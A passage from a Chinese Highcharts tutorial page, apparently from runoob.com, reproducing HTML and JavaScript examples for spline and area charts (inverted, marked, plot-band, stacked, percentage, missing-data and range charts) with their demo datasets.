0.678, 0.6833, 0.6856, 0.6903, 0.6896, 0.6896, 0.6882, 0.6879, 0.6862, 0.6852, 0.6823, 0.6813, 0.6813, 0.6822, 0.6802, 0.6802, 0.6784, 0.6748, 0.6747, 0.6747, 0.6748, 0.6733, 0.665, 0.6611, 0.6583, 0.659, 0.659, 0.6581, 0.6578, 0.6574, 0.6532, 0.6502, 0.6514, 0.6514, 0.6507, 0.651, 0.6489, 0.6424, 0.6406, 0.6382, 0.6382, 0.6341, 0.6344, 0.6378, 0.6439, 0.6478, 0.6481, 0.6481, 0.6494, 0.6438, 0.6377, 0.6329, 0.6336, 0.6333, 0.6333, 0.633, 0.6371, 0.6403, 0.6396, 0.6364, 0.6356, 0.6356, 0.6368, 0.6357, 0.6354, 0.632, 0.6332, 0.6328, 0.6331, 0.6342, 0.6321, 0.6302, 0.6278, 0.6308, 0.6324, 0.6324, 0.6307, 0.6277, 0.6269, 0.6335, 0.6392, 0.64, 0.6401, 0.6396, 0.6407, 0.6423, 0.6429, 0.6472, 0.6485, 0.6486, 0.6467, 0.6444, 0.6467, 0.6509, 0.6478, 0.6461, 0.6461, 0.6468, 0.6449, 0.647, 0.6461, 0.6452, 0.6422, 0.6422, 0.6425, 0.6414, 0.6366, 0.6346, 0.635, 0.6346, 0.6346, 0.6343, 0.6346, 0.6379, 0.6416, 0.6442, 0.6431, 0.6431, 0.6435, 0.644, 0.6473, 0.6469, 0.6386, 0.6356, 0.634, 0.6346, 0.643, 0.6452, 0.6467, 0.6506, 0.6504, 0.6503, 0.6481, 0.6451, 0.645, 0.6441, 0.6414, 0.6409, 0.6409, 0.6428, 0.6431, 0.6418, 0.6371, 0.6349, 0.6333, 0.6334, 0.6338, 0.6342, 0.632, 0.6318, 0.637, 0.6368, 0.6368, 0.6383, 0.6371, 0.6371, 0.6355, 0.632, 0.6277, 0.6276, 0.6291, 0.6274, 0.6293, 0.6311, 0.631, 0.6312, 0.6312, 0.6304, 0.6294, 0.6348, 0.6378, 0.6368, 0.6368, 0.6368, 0.636, 0.637, 0.6418, 0.6411, 0.6435, 0.6427, 0.6427, 0.6419, 0.6446, 0.6468, 0.6487, 0.6594, 0.6666, 0.6666, 0.6678, 0.6712, 0.6705, 0.6718, 0.6784, 0.6811, 0.6811, 0.6794, 0.6804, 0.6781, 0.6756, 0.6735, 0.6763, 0.6762, 0.6777, 0.6815, 0.6802, 0.678, 0.6796, 0.6817, 0.6817, 0.6832, 0.6877, 0.6912, 0.6914, 0.7009, 0.7012, 0.701, 0.7005, 0.7076, 0.7087, 0.717, 0.7105, 0.7031, 0.7029, 0.7006, 0.7035, 0.7045, 0.6956, 0.6988, 0.6915, 0.6914, 0.6859, 0.6778, 0.6815, 0.6815, 0.6843, 0.6846, 0.6846, 0.6923, 0.6997, 0.7098, 0.7188, 0.7232, 0.7262, 0.7266, 0.7359, 0.7368, 0.7337, 0.7317, 0.7387, 0.7467, 0.7461, 0.7366, 0.7319, 0.7361, 0.7437, 0.7432, 0.7461, 0.7461, 0.7454, 0.7549, 0.7742, 0.7801, 0.7903, 0.7876, 0.7928, 0.7991, 0.8007, 0.7823, 0.7661, 0.785, 0.7863, 0.7862, 0.7821, 0.7858, 0.7731, 0.7779, 0.7844, 0.7866, 0.7864, 0.7788, 0.7875, 0.7971, 0.8004, 0.7857, 0.7932, 0.7938, 0.7927, 0.7918, 0.7919, 0.7989, 0.7988, 0.7949, 0.7948, 0.7882, 0.7745, 0.771, 0.775, 0.7791, 0.7882, 0.7882, 0.7899, 0.7905, 0.7889, 0.7879, 0.7855, 0.7866, 0.7865, 0.7795, 0.7758, 0.7717, 0.761, 0.7497, 0.7471, 0.7473, 0.7407, 0.7288, 0.7074, 0.6927, 0.7083, 0.7191, 0.719, 0.7153, 0.7156, 0.7158, 0.714, 0.7119, 0.7129, 0.7129, 0.7049, 0.7095 ] &#125; ]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.subtitle = subtitle; json.legend = legend; json.xAxis = xAxis; json.yAxis = yAxis; json.series = series; json.plotOptions = plotOptions; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例四X轴翻转曲线 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'spline', inverted: true &#125;; var title = &#123; text: 'Atmosphere Temperature by Altitude' &#125;; var subtitle = &#123; text: 'According to the Standard Atmosphere Model' &#125;; var xAxis = &#123; reversed: false, title: &#123; enabled: true, text: 'Altitude' &#125;, labels: &#123; formatter: function () &#123; return this.value + 'km'; &#125; &#125;, maxPadding: 0.05, showLastLabel: true &#125;; var yAxis = &#123; title: &#123; text: 'Temperature' &#125;, labels: &#123; formatter: function () &#123; return this.value + '\xB0'; &#125; &#125;, lineWidth: 2 &#125;; var legend = &#123; enabled: false &#125;; var tooltip = &#123; headerFormat: '&lt;b&gt;&#123;series.name&#125;&lt;/b&gt;&lt;br/&gt;', pointFormat: '&#123;point.x&#125; km: &#123;point.y&#125;\xB0C' &#125;; var plotOptions = &#123; spline: &#123; marker: &#123; enable: false &#125; &#125; &#125;; var series= [&#123; name: 'Temperature', data: [[0, 15], [10, -50], [20, -56.5], [30, -46.5], [40, -22.1], [50, -2.5], [60, -27.7], [70, -55.7], [80, -76.5]] &#125;]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.subtitle = subtitle; json.legend = legend; json.tooltip = tooltip; json.xAxis = xAxis; json.yAxis = yAxis; json.series = series; json.plotOptions = plotOptions; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例五带标记曲线图 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'spline' &#125;; var title = &#123; text: 'Monthly Average Temperature' &#125;; var subtitle = &#123; text: 'Source: WorldClimate.com' &#125;; var xAxis = &#123; categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'] &#125;; var yAxis = &#123; title: &#123; text: 'Temperature' &#125;, labels: &#123; formatter: function () &#123; return this.value + '\xB0'; &#125; &#125;, lineWidth: 2 &#125;; var tooltip = &#123; crosshairs: true, shared: true &#125;; var plotOptions = &#123; spline: &#123; marker: &#123; radius: 4, lineColor: '#666666', lineWidth: 1 &#125; &#125; &#125;; var series= [&#123; name: 'Tokyo', marker: &#123; symbol: 'square' &#125;, data: [7.0, 6.9, 9.5, 14.5, 18.2, 21.5, 25.2, &#123; y: 26.5, marker: &#123; symbol: 'url(http://www.highcharts.com/demo/gfx/sun.png)' &#125; &#125;, 23.3, 18.3, 13.9, 9.6] &#125;, &#123; name: 'London', marker: &#123; symbol: 'diamond' &#125;, data: [&#123; y: 3.9, marker: &#123; symbol: 'url(http://www.highcharts.com/demo/gfx/snow.png)' &#125; &#125;, 4.2, 5.7, 8.5, 11.9, 15.2, 17.0, 16.6, 14.2, 10.3, 6.6, 4.8] &#125; ]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.subtitle = subtitle; json.tooltip = tooltip; json.xAxis = xAxis; json.yAxis = yAxis; json.series = series; json.plotOptions = plotOptions; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例六标记区曲线图 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'spline' &#125;; var title = &#123; text: 'Wind speed during two days' &#125;; var subtitle = &#123; text: 'October 6th and 7th 2009 at two locations in Vik i Sogn, Norway' &#125;; var xAxis = &#123; type: 'datetime', labels: &#123; overflow: 'justify' &#125; &#125;; var yAxis = &#123; title: &#123; text: 'Wind speed (m/s)' &#125;, min: 0, minorGridLineWidth: 0, gridLineWidth: 0, alternateGridColor: null, plotBands: [&#123; // Light air from: 0.3, to: 1.5, color: 'rgba(68, 170, 213, 0.1)', label: &#123; text: 'Light air', style: &#123; color: '#606060' &#125; &#125; &#125;, &#123; // Light breeze from: 1.5, to: 3.3, color: 'rgba(0, 0, 0, 0)', label: &#123; text: 'Light breeze', style: &#123; color: '#606060' &#125; &#125; &#125;, &#123; // Gentle breeze from: 3.3, to: 5.5, color: 'rgba(68, 170, 213, 0.1)', label: &#123; text: 'Gentle breeze', style: &#123; color: '#606060' &#125; &#125; &#125;, &#123; // Moderate breeze from: 5.5, to: 8, color: 'rgba(0, 0, 0, 0)', label: &#123; text: 'Moderate breeze', style: &#123; color: '#606060' &#125; &#125; &#125;, &#123; // Fresh breeze from: 8, to: 11, color: 'rgba(68, 170, 213, 0.1)', label: &#123; text: 'Fresh breeze', style: &#123; color: '#606060' &#125; &#125; &#125;, &#123; // Strong breeze from: 11, to: 14, color: 'rgba(0, 0, 0, 0)', label: &#123; text: 'Strong breeze', style: &#123; color: '#606060' &#125; &#125; &#125;, &#123; // High wind from: 14, to: 15, color: 'rgba(68, 170, 213, 0.1)', label: &#123; text: 'High wind', style: &#123; color: '#606060' &#125; &#125; &#125;] &#125;; var tooltip = &#123; valueSuffix: ' m/s' &#125;; var plotOptions = &#123; spline: &#123; lineWidth: 4, states: &#123; hover: &#123; lineWidth: 5 &#125; &#125;, marker: &#123; enabled: false &#125;, pointInterval: 3600000, // one hour pointStart: Date.UTC(2009, 9, 6, 0, 0, 0) &#125; &#125;; var series= [&#123; name: 'Vik i Sogn', data: [4.3, 5.1, 4.3, 5.2, 5.4, 4.7, 3.5, 4.1, 5.6, 7.4, 6.9, 7.1, 7.9, 7.9, 7.5, 6.7, 7.7, 7.7, 7.4, 7.0, 7.1, 5.8, 5.9, 7.4, 8.2, 8.5, 9.4, 8.1, 10.9, 10.4, 10.9, 12.4, 12.1, 9.5, 7.5, 7.1, 7.5, 8.1, 6.8, 3.4, 2.1, 1.9, 2.8, 2.9, 1.3, 4.4, 4.2, 3.0, 3.0] &#125;, &#123; name: 'Norway', data: [0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.1, 0.0, 0.3, 0.0, 0.0, 0.4, 0.0, 0.1, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.6, 1.2, 1.7, 0.7, 2.9, 4.1, 2.6, 3.7, 3.9, 1.7, 2.3, 3.0, 3.3, 4.8, 5.0, 4.8, 5.0, 3.2, 2.0, 0.9, 0.4, 0.3, 0.5, 0.4] &#125;]; var navigation = &#123; menuItemStyle: &#123; fontSize: '10px' &#125; &#125; var json = &#123;&#125;; json.chart = chart; json.title = title; json.subtitle = subtitle; json.tooltip = tooltip; json.xAxis = xAxis; json.yAxis = yAxis; json.series = series; json.plotOptions = plotOptions; json.navigation = navigation; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 区域图示例示例1基本区域图: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'area' &#125;; var title = &#123; text: 'US and USSR nuclear stockpiles' &#125;; var subtitle = &#123; text: 'Source: &lt;a href="http://thebulletin.metapress.com/content/c4120650912x74k7/fulltext.pdf"&gt;' + 'thebulletin.metapress.com&lt;/a&gt;' &#125;; var xAxis = &#123; allowDecimals: false, labels: &#123; formatter: function () &#123; return this.value; // clean, unformatted number for year &#125; &#125; &#125;; var yAxis = &#123; title: &#123; text: 'Nuclear weapon states' &#125;, labels: &#123; formatter: function () &#123; return this.value / 1000 + 'k'; &#125; &#125; &#125;; var tooltip = &#123; pointFormat: '&#123;series.name&#125; produced &lt;b&gt;&#123;point.y:,.0f&#125;&lt;/b&gt;&lt;br/&gt;warheads in &#123;point.x&#125;' &#125;; var plotOptions = &#123; area: &#123; pointStart: 1940, marker: &#123; enabled: false, symbol: 'circle', radius: 2, states: &#123; hover: &#123; enabled: true &#125; &#125; &#125; &#125; &#125;; var series= [&#123; name: 'USA', data: [null, null, null, null, null, 6, 11, 32, 110, 235, 369, 640, 1005, 1436, 2063, 3057, 4618, 6444, 9822, 15468, 20434, 24126, 27387, 29459, 31056, 31982, 32040, 31233, 29224, 27342, 26662, 26956, 27912, 28999, 28965, 27826, 25579, 25722, 24826, 24605, 24304, 23464, 23708, 24099, 24357, 24237, 24401, 24344, 23586, 22380, 21004, 17287, 14747, 13076, 12555, 12144, 11009, 10950, 10871, 10824, 10577, 10527, 10475, 10421, 10358, 10295, 10104] &#125;, &#123; name: 'USSR/Russia', data: [null, null, null, null, null, null, null, null, null, null, 5, 25, 50, 120, 150, 200, 426, 660, 869, 1060, 1605, 2471, 3322, 4238, 5221, 6129, 7089, 8339, 9399, 10538, 11643, 13092, 14478, 15915, 17385, 19055, 21205, 23044, 25393, 27935, 30062, 32049, 33952, 35804, 37431, 39197, 45000, 43000, 41000, 39000, 37000, 35000, 33000, 31000, 29000, 27000, 25000, 24000, 23000, 22000, 21000, 20000, 19000, 18000, 18000, 17000, 16000] &#125; ]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.subtitle = subtitle; json.tooltip = tooltip; json.xAxis = xAxis; json.yAxis = yAxis; json.series = series; json.plotOptions = plotOptions; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例2负数区域图 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'area' &#125;; var title = &#123; text: 'Area chart with negative values' &#125;; var xAxis = &#123; categories: ['Apples', 'Oranges', 'Pears', 'Grapes', 'Bananas'] &#125;; var credits = &#123; enabled: false &#125;; var series= [&#123; name: 'John', data: [5, 3, 4, 7, 2] &#125;, &#123; name: 'Jane', data: [2, -2, -3, 2, 1] &#125;, &#123; name: 'Joe', data: [3, 4, 4, -2, 5] &#125; ]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.xAxis = xAxis; json.credits = credits; json.series = series; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例3堆叠区域图 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'area' &#125;; var title = &#123; text: 'Historic and Estimated Worldwide Population Growth by Region' &#125;; var subtitle = &#123; text: 'Source: Wikipedia.org' &#125;; var xAxis = &#123; categories: ['1750', '1800', '1850', '1900', '1950', '1999', '2050'], tickmarkPlacement: 'on', title: &#123; enabled: false &#125; &#125;; var yAxis = &#123; title: &#123; text: 'Billions' &#125;, labels: &#123; formatter: function () &#123; return this.value / 1000; &#125; &#125; &#125;; var tooltip = &#123; shared: true, valueSuffix: ' millions' &#125;; var plotOptions = &#123; area: &#123; stacking: 'normal', lineColor: '#666666', lineWidth: 1, marker: &#123; lineWidth: 1, lineColor: '#666666' &#125; &#125; &#125;; var credits = &#123; enabled: false &#125;; var series= [&#123; name: 'Asia', data: [502, 635, 809, 947, 1402, 3634, 5268] &#125;, &#123; name: 'Africa', data: [106, 107, 111, 133, 221, 767, 1766] &#125;, &#123; name: 'Europe', data: [163, 203, 276, 408, 547, 729, 628] &#125;, &#123; name: 'America', data: [18, 31, 54, 156, 339, 818, 1201] &#125;, &#123; name: 'Oceania', data: [2, 2, 2, 6, 13, 30, 46] &#125; ]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.subtitle = subtitle; json.xAxis = xAxis; json.yAxis = yAxis; json.tooltip = tooltip; json.plotOptions = plotOptions; json.credits = credits; json.series = series; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例4使用百分比堆叠区域图 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'area' &#125;; var title = &#123; text: 'Historic and Estimated Worldwide Population Growth by Region' &#125;; var subtitle = &#123; text: 'Source: Wikipedia.org' &#125;; var xAxis = &#123; categories: ['1750', '1800', '1850', '1900', '1950', '1999', '2050'], tickmarkPlacement: 'on', title: &#123; enabled: false &#125; &#125;; var yAxis = &#123; title: &#123; text: 'Billions' &#125;, labels: &#123; formatter: function () &#123; return this.value / 1000; &#125; &#125; &#125;; var tooltip = &#123; shared: true, valueSuffix: ' millions' &#125;; var plotOptions = &#123; area: &#123; stacking: 'percent', lineColor: '#666666', lineWidth: 1, marker: &#123; lineWidth: 1, lineColor: '#666666' &#125; &#125; &#125;; var credits = &#123; enabled: false &#125;; var series= [&#123; name: 'Asia', data: [502, 635, 809, 947, 1402, 3634, 5268] &#125;, &#123; name: 'Africa', data: [106, 107, 111, 133, 221, 767, 1766] &#125;, &#123; name: 'Europe', data: [163, 203, 276, 408, 547, 729, 628] &#125;, &#123; name: 'America', data: [18, 31, 54, 156, 339, 818, 1201] &#125;, &#123; name: 'Oceania', data: [2, 2, 2, 6, 13, 30, 46] &#125; ]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.subtitle = subtitle; json.xAxis = xAxis; json.yAxis = yAxis; json.tooltip = tooltip; json.plotOptions = plotOptions; json.credits = credits; json.series = series; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例5丢失数据的区域图 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'area', spacingBottom: 30 &#125;; var title = &#123; text: 'Fruit consumption *' &#125;; var subtitle = &#123; text: '* Jane\'s banana consumption is unknown', floating: true, align: 'right', verticalAlign: 'bottom', y: 15 &#125;; var legend = &#123; layout: 'vertical', align: 'left', verticalAlign: 'top', x: 150, y: 100, floating: true, borderWidth: 1, backgroundColor: (Highcharts.theme &amp;&amp; Highcharts.theme.legendBackgroundColor) || '#FFFFFF' &#125;; var xAxis = &#123; categories: ['Apples', 'Pears', 'Oranges', 'Bananas', 'Grapes', 'Plums', 'Strawberries', 'Raspberries'] &#125;; var yAxis = &#123; title: &#123; text: 'Y-Axis' &#125;, labels: &#123; formatter: function () &#123; return this.value; &#125; &#125; &#125;; var tooltip = &#123; formatter: function () &#123; return '&lt;b&gt;' + this.series.name + '&lt;/b&gt;&lt;br/&gt;' + this.x + ': ' + this.y; &#125; &#125;; var plotOptions = &#123; area: &#123; fillOpacity: 0.5 &#125; &#125;; var credits = &#123; enabled: false &#125;; var series= [&#123; name: 'John', data: [0, 1, 4, 4, 5, 2, 3, 7] &#125;, &#123; name: 'Jane', data: [1, 0, 3, null, 3, 1, 2, 1] &#125; ]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.subtitle = subtitle; json.xAxis = xAxis; json.yAxis = yAxis; json.legend = legend; json.tooltip = tooltip; json.plotOptions = plotOptions; json.credits = credits; json.series = series; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例6曲线区域图 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;html&gt;&lt;head&gt;&lt;meta charset="UTF-8" /&gt;&lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt;&lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'areaspline' &#125;; var title = &#123; text: 'Average fruit consumption during one week' &#125;; var subtitle = &#123; style: &#123; position: 'absolute', right: '0px', bottom: '10px' &#125; &#125;; var legend = &#123; layout: 'vertical', align: 'left', verticalAlign: 'top', x: 150, y: 100, floating: true, borderWidth: 1, backgroundColor: (Highcharts.theme &amp;&amp; Highcharts.theme.legendBackgroundColor) || '#FFFFFF' &#125;; var xAxis = &#123; categories: ['Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Sunday'] &#125;; var yAxis = &#123; title: &#123; text: 'Fruit units' &#125; &#125;; var tooltip = &#123; shared: true, valueSuffix: ' units' &#125;; var credits = &#123; enabled: false &#125; var plotOptions = &#123; areaspline: &#123; fillOpacity: 0.5 &#125; &#125;; var series= [&#123; name: 'John', data: [3, 4, 3, 5, 4, 10, 12] &#125;, &#123; name: 'Jane', data: [1, 3, 4, 3, 3, 5, 4] &#125; ]; var json = &#123;&#125;; json.chart = chart; json.title = title; json.subtitle = subtitle; json.xAxis = xAxis; json.yAxis = yAxis; json.legend = legend; json.plotOptions = plotOptions; json.credits = credits; json.series = series; $('#container').highcharts(json); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例7区间区域图 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;html&gt;&lt;head&gt; &lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt; &lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt; &lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt; &lt;script src="https://code.highcharts.com/highcharts-more.js"&gt;&lt;/script&gt; &lt;script src="https://code.highcharts.com/modules/data.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var chart = &#123; type: 'arearange', zoomType: 'x' &#125;; var title = &#123; text: 'Temperature variation by day' &#125;; var xAxis = &#123; type: 'datetime' &#125;; var yAxis = &#123; title: &#123; text: null &#125; &#125;; var tooltip = &#123; shared: true, crosshairs: true, valueSuffix: '\xB0C' &#125;; var legend = &#123; enabled: false &#125; var json = &#123;&#125;; json.chart = chart; json.title = title; json.xAxis = xAxis; json.yAxis = yAxis; json.legend = legend; $.getJSON('http://www.highcharts.com/samples/data/jsonp.php?filename=range.json&amp;callback=?', function (data) &#123; var series= [&#123; name: 'Temperatures', data: data &#125; ]; json.series = series; $('#container').highcharts(json); &#125;); &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 示例8使用区间和线的区域图 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128&lt;html&gt;&lt;head&gt; &lt;title&gt;Highcharts 教程 | 菜鸟教程(runoob.com)&lt;/title&gt; &lt;script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"&gt;&lt;/script&gt; &lt;script src="https://code.highcharts.com/highcharts.js"&gt;&lt;/script&gt; &lt;script src="https://code.highcharts.com/highcharts-more.js"&gt;&lt;/script&gt; &lt;/head&gt;&lt;body&gt;&lt;div id="container" style="width: 550px; height: 400px; margin: 0 auto"&gt;&lt;/div&gt;&lt;script language="JavaScript"&gt;$(document).ready(function() &#123; var ranges = [ [1246406400000, 14.3, 27.7], [1246492800000, 14.5, 27.8], [1246579200000, 15.5, 29.6], [1246665600000, 16.7, 30.7], [1246752000000, 16.5, 25.0], [1246838400000, 17.8, 25.7], [1246924800000, 13.5, 24.8], [1247011200000, 10.5, 21.4], [1247097600000, 9.2, 23.8], [1247184000000, 11.6, 21.8], [1247270400000, 10.7, 23.7], [1247356800000, 11.0, 23.3], [1247443200000, 11.6, 23.7], [1247529600000, 11.8, 20.7], [1247616000000, 12.6, 22.4], [1247702400000, 13.6, 19.6], [1247788800000, 11.4, 22.6], [1247875200000, 13.2, 25.0], [1247961600000, 14.2, 21.6], [1248048000000, 13.1, 17.1], [1248134400000, 12.2, 15.5], [1248220800000, 12.0, 20.8], [1248307200000, 12.0, 17.1], [1248393600000, 12.7, 18.3], [1248480000000, 12.4, 19.4], [1248566400000, 12.6, 19.9], [1248652800000, 11.9, 20.2], [1248739200000, 11.0, 19.3], [1248825600000, 10.8, 17.8], [1248912000000, 11.8, 18.5], [1248998400000, 10.8, 16.1] ]; var averages = [ [1246406400000, 21.5], [1246492800000, 22.1], [1246579200000, 23], [1246665600000, 23.8], [1246752000000, 21.4], [1246838400000, 21.3], [1246924800000, 18.3], [1247011200000, 15.4], [1247097600000, 16.4], [1247184000000, 17.7], [1247270400000, 17.5], [1247356800000, 17.6], [1247443200000, 17.7], [1247529600000, 16.8], [1247616000000, 17.7], [1247702400000, 16.3], [1247788800000, 17.8], [1247875200000, 18.1], [1247961600000, 17.2], [1248048000000, 14.4], [1248134400000, 13.7], [1248220800000, 15.7], [1248307200000, 14.6], [1248393600000, 15.3], [1248480000000, 15.3], [1248566400000, 15.8], [1248652800000, 15.2], [1248739200000, 14.8], [1248825600000, 14.4], [1248912000000, 15], [1248998400000, 13.6] ]; var title = &#123; text: 'July temperatures' &#125;; var xAxis = &#123; type: 'datetime' &#125;; var yAxis = &#123; title: &#123; text: null &#125; &#125;; var tooltip = &#123; shared: true, crosshairs: true, valueSuffix: '\xB0C' &#125;; var legend = &#123; &#125; var series= [&#123; name: 'Temperature', data: averages, zIndex: 1, marker: &#123; fillColor: 'white', lineWidth: 2, lineColor: Highcharts.getOptions().colors[0] &#125; &#125;, &#123; name: 'Range', data: ranges, type: 'arearange', lineWidth: 0, linkedTo: ':previous', color: 